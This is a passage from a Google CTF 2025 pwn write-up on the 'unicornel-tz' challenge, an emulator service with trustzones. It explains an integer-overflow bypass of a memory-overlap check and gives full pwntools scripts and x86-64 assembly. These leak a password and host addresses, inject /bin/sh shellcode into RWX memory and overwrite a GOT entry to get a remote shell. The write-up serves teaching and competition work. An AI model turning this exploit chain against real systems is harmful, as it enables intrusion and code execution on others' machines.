- The check uses the formula: `!(src + n <= trustzone || trustzone + PAGE_ALIGN(tz_size) <= src)`

- This means that it will require trustzone privileges if the memory region intersects with trustzone memory

- Next, if the area is safe from any overlap, it will read the area with `uc_mem_read` and then print its contents


However, there are two bugs in how `unicornel_write` checks for trustzone access.


- First, the calculation `src + n` can overflow, allowing us to bypass the trustzone check through integer overflow. For example, if `src` is set to `0xFFFFFFFFFFFFF000` and `n` is `0x1000`, then `src + n` will wrap around to zero (`0`). This makes the check think the region is before the trustzone and allows reading trustzone memory without proper privileges.

- Second, `unicornel_write` uses `safe_read` which calls `uc_mem_read` to fetch the data to be printed. Using `uc_mem_read` to read data from the trustzone area will never trigger the set hook, because hooks are only triggered by read operations from emulated environment instructions, not from host `uc_mem_read` calls.


With this bug, we can see that if we map any `trustzone` at the address `0xFFFFFFFFFFFFF000`, we can basically print its content through the `unicornel_write` syscall, because `overlaps_tz` is bypassed, and the hook is not triggered because it reads the data with `uc_mem_read`.


With these bugs are being discovered, we can now start thinking about how to exploit the app.


### Solution


To recap, the bug allows us to use `unicornel_write` to leak `trustzone` contents by mapping the `trustzone` at address `0xFFFFFFFFFFFFF000`. Let’s start by creating a wrapper script that we can use to interact with and send our program to the application. This will help us leak some useful values.


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50

```


```
#!/usr/bin/env python3
from pwn import *
import unicorn
import os

context.arch = 'amd64'

exe        = './chal'
HOST, PORT = 'unicornel-tz.2025.ctfcompetition.com', 1337

def start():
    if args.LOCAL:
        return process(exe, stderr=open(os.devnull, 'w'))
    return remote(HOST, PORT)

shellcode = asm(
r'''
''')
assert len(shellcode) < 0x1000

io = start()
if not args.LOCAL:
    io.recvuntil(b'run the solver with:\n')
    io.recvuntil(b' solve ')
    pow_chall = io.recvline().strip().decode()
    print(f'{pow_chall = }')
    pow_sol = os.popen(f'python3 kctf-pow.py solve {pow_chall} 2>/dev/null').read()
    print(f'{pow_sol = }')
    io.sendlineafter(b'Solution? ', pow_sol.encode())

io.recvuntil(b'Welcome')

CODE = shellcode
VA, SIZE = 0x1000, 0x1000
hdr = flat(
    p32(unicorn.UC_ARCH_X86),
    p32(unicorn.UC_MODE_64),
    p64(VA), p64(SIZE),          # one RX page for code+data
    b'\0' * 3 * 16,              # unused maps
    p16(len(CODE)),              # code_length
    p8(1)                        # num_maps
).ljust(80, b'\0')

io.sendline(b'')
io.recvuntil(b'DATA_START')
io.send(hdr)
io.recvuntil(b'CODE_START')
io.send(CODE)

io.interactive()

```


With the above script, we can easily fill in the `shellcode` of our emulated program that will be sent by the script to the app.


#### Leak Password and Trustzones


Remember that we can actually load `password` into the `trustzone` area. This means, combined with the `unicornel_write` bug, we can leak the `password` value! This will allow us to enable usage of the trustzone named `memprot_x86_64` provided by the app later on. Furthermore, we can actually leak the 3 available trustzones provided by the app, so that we can start debugging the app locally (remember that the challenge files didn’t provide us the trustzone code, so we couldn’t really debug it locally before this).  Here’s what we need to write in our emulated program:


- Call the `create_trustzone` syscall by providing the filename we want to leak and setting `0xFFFFFFFFFFFFF000` as the mapped address

- Call the `unicornel_write` syscall to leak it

- Call the `destroy_trustzone` syscall if we want to leak another file (since the app only allows one `trustzone` per process)


So, let’s update our shellcode to leak the password and all the available trustzones. Below is the full script that I used to leak the values.


```
  1
  2
  3
  4
  5
  6
  7
  8
  9
 10
 11
 12
 13
 14
 15
 16
 17
 18
 19
 20
 21
 22
 23
 24
 25
 26
 27
 28
 29
 30
 31
 32
 33
 34
 35
 36
 37
 38
 39
 40
 41
 42
 43
 44
 45
 46
 47
 48
 49
 50
 51
 52
 53
 54
 55
 56
 57
 58
 59
 60
 61
 62
 63
 64
 65
 66
 67
 68
 69
 70
 71
 72
 73
 74
 75
 76
 77
 78
 79
 80
 81
 82
 83
 84
 85
 86
 87
 88
 89
 90
 91
 92
 93
 94
 95
 96
 97
 98
 99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153

```


```
#!/usr/bin/env python3
from pwn import *
import unicorn
import os

context.arch = 'amd64'

exe        = './chal'
HOST, PORT = 'unicornel-tz.2025.ctfcompetition.com', 1337

def start():
    if args.LOCAL:
        return process(exe, stderr=open(os.devnull, 'w'))
    return remote(HOST, PORT)

shellcode = asm(
r'''
.intel_syntax noprefix

/* Call create_trustzone 'password' */
mov r12, 0xFFFFFFFFFFFFF000
mov rbx, r12
lea rcx, [rip + password]
mov rax, 8
int 0x80

/* Call unicornel_write to leak password */
mov rbx, r12
mov rcx, 0x10
mov rax, 1
int 0x80

/* Call destroy_trustzone */
mov rax, 0x9
int 0x80

/* Call create_trustzone 'create_map_shared_x86_64' */
mov r12, 0xFFFFFFFFFFFFF000
mov rbx, r12
lea rcx, [rip + create_map_shared_x86_64]
mov rax, 8
int 0x80

/* Call unicornel_write to leak create_map_shared_x86_64 */
mov rbx, r12
mov rcx, 0x100
mov rax, 1
int 0x80

/* Call destroy_trustzone */
mov rax, 0x9
int 0x80

/* Call create_trustzone 'map_shared_x86_64' */
mov r12, 0xFFFFFFFFFFFFF000
mov rbx, r12
lea rcx, [rip + map_shared_x86_64]
mov rax, 8
int 0x80

/* Call unicornel_write to leak map_shared_x86_64 */
mov rbx, r12
mov rcx, 0x100
mov rax, 1
int 0x80

/* Call destroy_trustzone */
mov rax, 0x9
int 0x80

/* Call create_trustzone 'memprot_x86_64' */
mov r12, 0xFFFFFFFFFFFFF000
mov rbx, r12
lea rcx, [rip + memprot_x86_64]
mov rax, 8
int 0x80

/* Call unicornel_write to leak memprot_x86_64 */
mov rbx, r12
mov rcx, 0x100
mov rax, 1
int 0x80

/* Call destroy_trustzone */
mov rax, 0x9
int 0x80

password:
    .ascii "password\0"
create_map_shared_x86_64:
    .ascii "create_map_shared_x86_64\0"
map_shared_x86_64:
    .ascii "map_shared_x86_64\0"
memprot_x86_64:
    .ascii "memprot_x86_64\0"
''')
assert len(shellcode) < 0x1000

io = start()
if not args.LOCAL:
    io.recvuntil(b'run the solver with:\n')
    io.recvuntil(b' solve ')
    pow_chall = io.recvline().strip().decode()
    print(f'{pow_chall = }')
    pow_sol = os.popen(f'python3 kctf-pow.py solve {pow_chall} 2>/dev/null').read()
    print(f'{pow_sol = }')
    io.sendlineafter(b'Solution? ', pow_sol.encode())

io.recvuntil(b'Welcome')

CODE = shellcode
VA, SIZE = 0x1000, 0x1000
hdr = flat(
    p32(unicorn.UC_ARCH_X86),
    p32(unicorn.UC_MODE_64),
    p64(VA), p64(SIZE),          # one RX page for code+data
    b'\0' * 3 * 16,              # unused maps
    p16(len(CODE)),              # code_length
    p8(1)                        # num_maps
).ljust(80, b'\0')

io.sendline(b'')
io.recvuntil(b'DATA_START')
io.send(hdr)
io.recvuntil(b'CODE_START')
io.send(CODE)

io.recvuntil(b'pid 0\n')
password = io.recv(0x10)
print(f'{password = }\n')
create_map_shared_x86_64 = io.recv(0x100).strip(b'\x00')
print(f'{create_map_shared_x86_64 = }\n')
map_shared_x86_64 = io.recv(0x100).strip(b'\x00')
print(f'{map_shared_x86_64 = }\n')
memprot_x86_64 = io.recv(0x100).strip(b'\x00')
print(f'{memprot_x86_64 = }\n')

with open('password', 'wb') as f:
    f.write(password)

with open('create_map_shared_x86_64', 'wb') as f:
    f.write(create_map_shared_x86_64)

with open('map_shared_x86_64', 'wb') as f:
    f.write(map_shared_x86_64)

with open('memprot_x86_64', 'wb') as f:
    f.write(memprot_x86_64)

print(f'Leaked is written to the file')


io.interactive()

```


As you can see, if we run the above script, we will be able to get the `password` and all of the `trustzones`. For local debugging purposes, I also stored them in files, just like how the app stores them on the server.


#### Leak Shared Buffers


Now that we can leak the password and all of the trustzones, we can debug the application locally. For the next step of exploitation, we need to consider that with the password in our hand, we can utilize the `memprot_x86_64` trustzone provided by the app to change the memory permissions of any address in our emulated process space.


Remember that the `trustzone` area is **writeable! This means if we call `memprot_x86_64` to modify the permissions of the mapped trustzone from `r-x` to `rwx`, we can overwrite it with our own shellcode. Later on, when we call `trustzone_invoke`, our shellcode will execute with elevated privileges since it runs in `trustzone_mode`, giving us the ability to perform privileged operations.


Now, we want to leak something useful. I observed that in `validate_handle`, it actually returns the raw pointer of `shared_buffer`, which is an address in the host process. This means if we overwrite the `trustzone` to execute `validate_handle`, we can make the emulated program hold the address of `shared_buffer` in any register. This will be useful in the future, but for now, let’s try to leak the `shared_buffer` pointer and store it in register `r12`. Here’s what we want to do:


- Call `create_shared` syscall to insert a `shared_buffer` with handle `0` into the `shared_buffers` array.

- Call `create_trustzone` syscall to load the available `memprot_x86_64` trustzone.

- Call `trustzone_invoke` syscall to `memprot` our trustzone from `r-x` to `rwx`.

- Now, because the `trustzone` area is writeable, overwrite it with our own shellcode that will:


- Call `validate_handle` to fetch the `shared_buffer` address.

- Store it in `r12` (so that we can use it later in our shellcode).

- Print it as well with the `print_integer` syscall for debugging purposes.


It’s time for us to modify our previous script. Below is my shellcode to do it:


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60

```


```
shellcode = asm(
r'''
.intel_syntax noprefix

/* Call create_shared */
mov rbx, 0x1000
mov rax, 3
int 0x80 # Handle 0 will be created

/* Call create_trustzone 'memprot_x86_64' */
mov rbx, 0x4000
lea rcx, [rip + memprot_x86_64]
mov rax, 8
int 0x80
/* Invoke memprot to map trustzone with RWX permissions */
mov rbx, 0x4000
mov rcx, 0x1000
mov rdx, 0x7
lea rdi, [rip + password_str]
mov rax, 10
int 0x80

/* Overwrite trustzone to leak shared_buffers[0].buffer address */
mov rdi, 0x4000
lea rsi, [rip+leak_shared_buffers_0]
lea rcx, [rip+leak_shared_buffers_0_end]
sub rcx, rsi
rep movsb
/* invoke modified trustzone (which will print ptr) */
mov rax, 10
int 0x80

/* Pause so that we can debug */
mov rax, 0x6
int 0x80

leak_shared_buffers_0:
    /* Call validate_handle 0 */
    xor rbx, rbx
    xor rcx, rcx
    mov rax, 4
    int 0x80
    mov r12, rax # store leaked value at r12
    /* Print leak for debugging purposes */
    mov rbx, rax
    mov rax, 0x2
    int 0x80
leak_shared_buffers_0_end:
password_str:
    .ascii "sup3r_s3cure_sj\0"
memprot_x86_64:
    .ascii "memprot_x86_64\0"
''')

...

io.recvuntil(b'pid 0\n')

leaked_addr = int(io.recvline().strip().decode())
print(f'{hex(leaked_addr) = }')

```


This time, we will run it locally first because we want to debug it further in our local. As you can see in the image below, we have successfully leaked the pointer of the allocated `shared_buffer`.


Now, we can move to the next step of the exploitation.


#### Leak PIE and RWX


Now, let’s fire up our GDB and start on checking what can we do with that leaked address. Before that, let’s check the process memory mapping first to get undertanding on the host process memory layout.


As we can see, there is an `rwx` area in memory. If we could leak this `rwx` address, it would be very useful for our exploit.


I observed that the custom `map_address` syscall allows us to map host process addresses into our emulated program space. This means our emulated program can write to any area of the host process, as long as it executes in `trustzone_mode` (which we’ve already achieved).


So if we leak the `rwx` address and use the `map_address` syscall to map it, we can write our own shellcode into the host process memory, with the hope that we can later jump to and execute it.


Now, we can simply scan through the leaked address that we got before, whether we can leak any rwx area or not.


As you can see, from the **base address of our leaked address (which is located at `leaked_address-0x12bf0`), if we map it to our emulated process space with size `0x2000`, we can actually get the `rwx` pointer.


Not only the `rwx` pointer, we can also leak the PIE address as well (see below image).


Now we need to craft shellcode to put in the `trustzone` area. Since the `trustzone` area is still writeable from our last step, we can overwrite it with shellcode that will:


- Call `map_address` to map from the base address of our leaked address up to `base_address+0x2000`

- Store the base RWX address in `r10` and base PIE address in `r11` for later use

- Print the addresses using the `print_integer` syscall for debugging


Here is the extended script building on our previous code:


```
  1
  2
  3
  4
  5
  6
  7
  8
  9
 10
 11
 12
 13
 14
 15
 16
 17
 18
 19
 20
 21
 22
 23
 24
 25
 26
 27
 28
 29
 30
 31
 32
 33
 34
 35
 36
 37
 38
 39
 40
 41
 42
 43
 44
 45
 46
 47
 48
 49
 50
 51
 52
 53
 54
 55
 56
 57
 58
 59
 60
 61
 62
 63
 64
 65
 66
 67
 68
 69
 70
 71
 72
 73
 74
 75
 76
 77
 78
 79
 80
 81
 82
 83
 84
 85
 86
 87
 88
 89
 90
 91
 92
 93
 94
 95
 96
 97
 98
 99
100
101

```


```
shellcode = asm(
r'''
.intel_syntax noprefix

/* Call create_shared */
mov rbx, 0x1000
mov rax, 3
int 0x80 # Handle 0 will be created

/* Call create_trustzone 'memprot_x86_64' */
mov rbx, 0x4000
lea rcx, [rip + memprot_x86_64]
mov rax, 8
int 0x80
/* Invoke memprot to map trustzone with RWX permissions */
mov rbx, 0x4000
mov rcx, 0x1000
mov rdx, 0x7
lea rdi, [rip + password_str]
mov rax, 10
int 0x80

/* Overwrite trustzone to leak shared_buffers[0].buffer address */
mov rdi, 0x4000
lea rsi, [rip+leak_shared_buffers_0]
lea rcx, [rip+leak_shared_buffers_0_end]
sub rcx, rsi
rep movsb
/* invoke modified trustzone (which will print ptr) */
mov rax, 10
int 0x80

/* Overwrite trustzone to leak PIE and RWX address */
mov rdi, 0x4000
lea rsi, [rip+leak_pie_and_rwx]
lea rcx, [rip+leak_pie_and_rwx_end]
sub rcx, rsi
rep movsb
/* invoke modified trustzone (which will assign PIE to r11 and RWX to r10) */
mov rax, 10
int 0x80

/* Pause so that we can debug */
mov rax, 0x6
int 0x80

leak_shared_buffers_0:
    /* Call validate_handle 0 */
    xor rbx, rbx
    xor rcx, rcx
    mov rax, 4
    int 0x80
    mov r12, rax # store leaked value at r12
    /* Print leak for debugging purposes */
    mov rbx, rax
    mov rax, 0x2
    int 0x80
leak_shared_buffers_0_end:
leak_pie_and_rwx:
    /* Call map_address */
    mov rbx, 0x5000
    mov rcx, 0x2000
    mov rdx, r12 # r12 is shared_buffers[0]
    sub rdx, 0x12bf0 # map to the base of area instead of to the shared_buffers[0]
    mov rax, 5
    int 0x80
    /* Store leaked pie at r11 and leaked rwx at r10 */
    mov rbx, 0x5000
    add rbx, 0x1100
    mov r11, qword ptr [rbx]
    sub r11, 0x785b20 # r11 = PIE BASE
    mov rbx, 0x5000
    add rbx, 0x0b88
    mov r10, qword ptr [rbx]
    sub r10, 0x1c2f # r10 = RWX BASE
    /* Print for debugging purposes */
    mov rbx, r11
    mov rax, 0x2
    int 0x80
    mov rbx, r10
    mov rax, 0x2
    int 0x80
leak_pie_and_rwx_end:
password_str:
    .ascii "sup3r_s3cure_sj\0"
memprot_x86_64:
    .ascii "memprot_x86_64\0"
''')

...

io.recvuntil(b'pid 0\n')

leaked_addr = int(io.recvline().strip().decode())
print(f'{hex(leaked_addr) = }')
pie_base = int(io.recvline().strip().decode())
print(f'{hex(pie_base) = }')
rwx_base = int(io.recvline().strip().decode())
print(f'{hex(rwx_base) = }')

io.interactive()

```


Above is the result of our execution. As we can see, `r10` and `r11` now contain the base RWX and base PIE addresses respectively (we already subtracted the leaked value with the offset to its own base in the shellcode). Now that we have both the base RWX and PIE addresses in hand, we can move to the next step, which is gaining RCE in the app.


#### Gain Remote Code Execution


If you run `checksec` on the app, you’ll see that the binary protection is actually only `Partial RELRO` 🙂.


This means we can simply overwrite the GOT of the app to gain RCE. To recap, up to this point, we already have:


- A pointer to RWX in `r10`

- A pointer to PIE in `r11`


My idea is pretty simple, inject shellcode into the RWX area, then place its address in the `write` GOT area. When we trigger the `unicornel_write` syscall (which calls `write` in the process), our shellcode will be executed by the host process. Here’s the high-level plan:


- Create shellcode to put in the `trustzone` that will overwrite the RWX area. This shellcode will:


- Call `map_address` to map the RWX area to our emulated process space

- Write our shellcode into it


- Create shellcode to put in the `trustzone` that will overwrite the GOT. This shellcode will:


- Call `map_address` to map the GOT area to our emulated process space

- Overwrite the `write` GOT entry with our shellcode address


- Simply call the `unicornel_write` syscall to spawn the shell


Below is the full exploit script:


```
  1
  2
  3
  4
  5
  6
  7
  8
  9
 10
 11
 12
 13
 14
 15
 16
 17
 18
 19
 20
 21
 22
 23
 24
 25
 26
 27
 28
 29
 30
 31
 32
 33
 34
 35
 36
 37
 38
 39
 40
 41
 42
 43
 44
 45
 46
 47
 48
 49
 50
 51
 52
 53
 54
 55
 56
 57
 58
 59
 60
 61
 62
 63
 64
 65
 66
 67
 68
 69
 70
 71
 72
 73
 74
 75
 76
 77
 78
 79
 80
 81
 82
 83
 84
 85
 86
 87
 88
 89
 90
 91
 92
 93
 94
 95
 96
 97
 98
 99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
185
186
187
188
189
190
191
192
193
194
195
196
197
198
199
200
201
202
203
204
205
206

```


```
#!/usr/bin/env python3
from pwn import *
import unicorn
import os

context.arch = 'amd64'

exe        = './chal'
HOST, PORT = 'unicornel-tz.2025.ctfcompetition.com', 1337

def start():
    if args.LOCAL:
        # return process(exe)
        return process(exe, stderr=open(os.devnull, 'w'))
    return remote(HOST, PORT)

shellcode = asm(
r'''
.intel_syntax noprefix

/* Call create_shared */
mov rbx, 0x1000
mov rax, 3
int 0x80 # Handle 0 will be created

/* Call create_trustzone 'memprot_x86_64' */
mov rbx, 0x4000
lea rcx, [rip + memprot_x86_64]
mov rax, 8
int 0x80
/* Invoke memprot to map trustzone with RWX permissions */
mov rbx, 0x4000
mov rcx, 0x1000
mov rdx, 0x7
lea rdi, [rip + password_str]
mov rax, 10
int 0x80

/* Overwrite trustzone to leak shared_buffers[0].buffer address */
mov rdi, 0x4000
lea rsi, [rip+leak_shared_buffers_0]
lea rcx, [rip+leak_shared_buffers_0_end]
sub rcx, rsi
rep movsb
/* invoke modified trustzone (which will print ptr) */
mov rax, 10
int 0x80

/* Overwrite trustzone to leak PIE and RWX address */
mov rdi, 0x4000
lea rsi, [rip+leak_pie_and_rwx]
lea rcx, [rip+leak_pie_and_rwx_end]
sub rcx, rsi
rep movsb
/* invoke modified trustzone (which will assign PIE to r11 and RWX to r10) */
mov rax, 10
int 0x80

/* Overwrite trustzone to map RWX address and fill with our shellcode */
add r10, 0x444400 # We plan to inject shellcode in the rwx+0x44000 area
mov rdi, 0x4000
lea rsi, [rip+fill_rwx]
lea rcx, [rip+fill_rwx_end]
sub rcx, rsi
rep movsb
/* invoke modified trustzone (which will assign PIE to r11 and RWX to r10) */
mov rax, 10
int 0x80

/* Overwrite trustzone to map PIE and overwrite GOT of write */
add r11, 0x120c050 # We plan to overwrite the GOT, so just simply allocate on it directly
mov rdi, 0x4000
lea rsi, [rip+fill_pie]
lea rcx, [rip+fill_pie_end]
sub rcx, rsi
rep movsb
/* invoke modified trustzone (which will assign PIE to r11 and RWX to r10) */
mov rax, 10
int 0x80

/* Spawn shell by trigger write */
mov rbx, 0x8000
mov rcx, 0x1
mov rax, 0x1
int 0x80

/* Pause so that we can debug */
mov rax, 0x6
int 0x80

leak_shared_buffers_0:
    /* Call validate_handle 0 */
    xor rbx, rbx
    xor rcx, rcx
    mov rax, 4
    int 0x80
    mov r12, rax # store leaked value at r12
    /* Print leak for debugging purposes */
    mov rbx, rax
    mov rax, 0x2
    int 0x80
leak_shared_buffers_0_end:
leak_pie_and_rwx:
    /* Call map_address */
    mov rbx, 0x5000
    mov rcx, 0x2000
    mov rdx, r12 # r12 is shared_buffers[0]
    sub rdx, 0x12bf0 # map to the base of area instead of to the shared_buffers[0]
    mov rax, 5
    int 0x80
    /* Store leaked pie at r11 and leaked rwx at r10 */
    mov rbx, 0x5000
    add rbx, 0x1100
    mov r11, qword ptr [rbx]
    sub r11, 0x785b20 # r11 = PIE BASE
    mov rbx, 0x5000
    add rbx, 0x0b88
    mov r10, qword ptr [rbx]
    sub r10, 0x1c2f # r10 = RWX BASE
    /* Print for debugging purposes */
    mov rbx, r11
    mov rax, 0x2
    int 0x80
    mov rbx, r10
    mov rax, 0x2
    int 0x80
leak_pie_and_rwx_end:
fill_rwx:
    /* Call map_address */
    mov rbx, 0x7000
    mov rcx, 0x1000
    mov rdx, r10 # r10 = rwx address
    mov rax, 5
    int 0x80
    /* Fill shellcode to rwx */
    mov rdi, 0x7000
    lea rsi, [rip+sc]
    lea rcx, [rip+sc_end]
    sub rcx, rsi
    rep movsb
    sc:
        lea rdi, [rip+binsh_str]
        xor rsi, rsi
        xor rdx, rdx
        mov rax, 0x3b
        syscall
        binsh_str:
            .ascii "/bin/sh\0"
    sc_end:
fill_rwx_end:
fill_pie:
     /* Call map_address */
    mov rbx, 0x8000
    mov rcx, 0x1000
    mov rdx, r11 # r11 = write GOT address
    mov rax, 5
    int 0x80
    /* Overwrite "write" GOT with the shellcode address */
    mov qword ptr [rbx], r10
fill_pie_end:
password_str:
    .ascii "sup3r_s3cure_sj\0"
memprot_x86_64:
    .ascii "memprot_x86_64\0"
''')
assert len(shellcode) < 0x1000

io = start()
if not args.LOCAL:
    io.recvuntil(b'run the solver with:\n')
    io.recvuntil(b' solve ')
    pow_chall = io.recvline().strip().decode()
    print(f'{pow_chall = }')
    pow_sol = os.popen(f'python3 kctf-pow.py solve {pow_chall}').read()
    print(f'{pow_sol = }')
    io.sendlineafter(b'Solution? ', pow_sol.encode())

io.recvuntil(b'Welcome')

CODE = shellcode
VA, SIZE = 0x1000, 0x1000
hdr = flat(
    p32(unicorn.UC_ARCH_X86),
    p32(unicorn.UC_MODE_64),
    p64(VA), p64(SIZE),          # one RX page for code+data
    b'\0' * 3 * 16,              # unused maps
    p16(len(CODE)),              # code_length
    p8(1)                        # num_maps
).ljust(80, b'\0')

io.sendline(b'')
io.recvuntil(b'DATA_START')
io.send(hdr)
io.recvuntil(b'CODE_START')
io.send(CODE)

io.recvuntil(b'pid 0\n')

leaked_addr = int(io.recvline().strip().decode())
print(f'{hex(leaked_addr) = }')
pie_base = int(io.recvline().strip().decode())
print(f'{hex(pie_base) = }')
rwx_base = int(io.recvline().strip().decode())
print(f'{hex(rwx_base) = }')

io.interactive()

```


As you can see in the above image, we finally able to spawn a shell and fetch the flag 🙂

>


**Flag: CTF{HowDidYouLeakMyPassword}


# Social Media


Follow me on twitter


                Share on**


        * Writeup, Google CTF, Pwn, Unicorn, 2025


    *GreyCTF 2025
            *ICC 2025


            *

        **
